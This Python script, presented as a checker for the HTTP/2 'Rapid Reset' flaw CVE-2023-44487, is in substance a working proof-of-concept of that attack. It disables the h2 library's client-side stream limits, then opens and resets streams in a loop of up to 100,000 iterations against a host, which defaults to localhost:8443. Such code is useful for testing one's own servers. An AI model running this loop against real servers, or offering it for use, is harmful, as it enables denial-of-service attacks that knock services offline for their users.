import threading
import socket
from h2.connection import H2Connection
from h2.events import RequestReceived, StreamReset, RemoteSettingsChanged, DataReceived, StreamEnded, ResponseReceived, ConnectionTerminated
from h2.config import H2Configuration
from h2.exceptions import ProtocolError
from h2.settings import SettingCodes
import ssl
from h2.errors import ErrorCodes
import sys
import fcntl
import os

def is_cve_2023_44487_vulnerable(host, port):
    # Wrap the socket for TLS
    ctx = ssl.create_default_context()
    ctx.options |= (
        ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
    )
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.options |= ssl.OP_NO_COMPRESSION
    ctx.set_ciphers("ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20")

    ctx.set_alpn_protocols(['h2'])

    sock = socket.create_connection((host, port))
    sock = ctx.wrap_socket(sock, server_hostname=host)
    sock.setblocking(False)

    # Make sure we're using HTTP/2
    if sock.selected_alpn_protocol() != 'h2':
        return False

    # Create HTTP/2 connection
    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    max_streams = 128
    streams = {}
    itr = 0
    max_itr = 1000 * 100

    # Read some data
    while True:
        itr = itr + 1
        if itr > max_itr:
            # presumed not vulnerable after this long
            return False

        try:
            data = sock.recv(65535)
        except ssl.SSLWantReadError as e:
            data = bytes()

        # pretend we can open an extreme amount of streams and disable client-side protections in h2
        conn.remote_settings.max_concurrent_streams = 0xffffffff

        # Create a new stream and immediately reset it 
        stream_id = conn.get_next_available_stream_id()
        conn.send_headers(
            stream_id,
            [(':method', 'GET'), (':authority', host), (':path', '/'), (':scheme', 'https')],
        )
        sock.sendall(conn.data_to_send())
        streams[stream_id] = True
        print(f"Created stream {stream_id}")

        events = []
        try:
            events = conn.receive_data(data)
        except:
            pass

        for event in events:
            if isinstance(event, StreamReset):
                if event.stream_id in streams:
                    del streams[event.stream_id]
                print(f"Stream {event.stream_id} reset.")
            elif isinstance(event, StreamEnded):
                if event.stream_id in streams:
                    del streams[event.stream_id]
                print("Stream {event.stream_id} ended.")
            elif isinstance(event, RemoteSettingsChanged):
                max_streams = event.changed_settings[SettingCodes.MAX_CONCURRENT_STREAMS].new_value
                print(f"Stream max concurrent streams {max_streams}")
            elif isinstance(event, ConnectionTerminated):
                return False # not vulnerable
            else:
                print(event)

        count = len(streams)

        if count > (max_streams * 10) + 1:
            print(f"Exceeded max streams of {max_streams} ({count} active)")
            return True

        print(count)

        for stream_id in streams.keys():
            try:
                conn.reset_stream(stream_id)
                print(f"reset stream {stream_id}")
            except:
                pass 
                


def main():
    result = is_cve_2023_44487_vulnerable("localhost", 8443)
    print(f"Vulnerable? {result}")

if __name__ == '__main__':
    sys.exit(main()) 